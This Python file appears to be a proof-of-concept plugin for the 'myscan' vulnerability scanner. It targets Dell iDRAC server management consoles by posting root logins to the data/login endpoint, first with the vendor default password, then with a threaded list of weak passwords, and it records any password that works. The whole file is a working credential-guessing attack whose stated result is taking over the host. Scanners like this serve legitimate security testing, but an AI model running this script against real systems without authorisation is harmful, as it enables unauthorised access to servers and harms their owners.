# !/usr/bin/env python3
# @Time    : 2020/11/12
# @Author  : caicai
# @File    : poc_dell_idrac_weak_passwd_2020.py


from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
import copy
from myscan.lib.core.threads import mythread


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "idrac_weak_passwd"
        self.vulmsg = "take over host"
        self.level = 2  # 0:Low  1:Medium 2:High
        self.isidrac = False
        self.success = False

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") == 3 and self.dictdata["url"]["protocol"] == "https":
            host = self.dictdata["url"]["host"]
            self.req = {
                "method": "POST",
                "url": self.url + "data/login",
                "timeout": 30,
                "headers": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Connection": "close",
                    "Accept": "*/*",
                    "Origin": "https://{}".format(host),
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Dest": "empty",
                    "Referer": "https://{}/login.html".format(host),
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9"},
                "data": '''user=root&password={}''',
                "allow_redirects": False,
                "verify": False,
            }
            self.run("calvin")
            if not self.success and self.isidrac:
                pwds = ["123456", "root", "!QAZ2wsx", "idarc"]
                mythread(self.run, pwds)

    def run(self, pwd):
        if self.success:
            return
        req_ = copy.deepcopy(self.req)
        req_["data"] = req_["data"].format(pwd)
        r = request(**req_)
        if r is not None and r.status_code == 200:
            if b"<authResult>0</authResult>" in r.content:
                self.success = True
                self.save(r, pwd)
            elif b"<authResult>1</authResult>" in r.content:
                self.isidrac = True

    def save(self, r, password):
        parser_ = response_parser(r)
        self.result.append({
            "name": self.name,
            "url": parser_.geturl(),
            "level": self.level,  # 0:Low  1:Medium 2:High
            "detail": {
                "vulmsg": self.vulmsg,
                "password": password,
                "request": parser_.getrequestraw(),
                "response": parser_.getresponseraw()
            }
        })
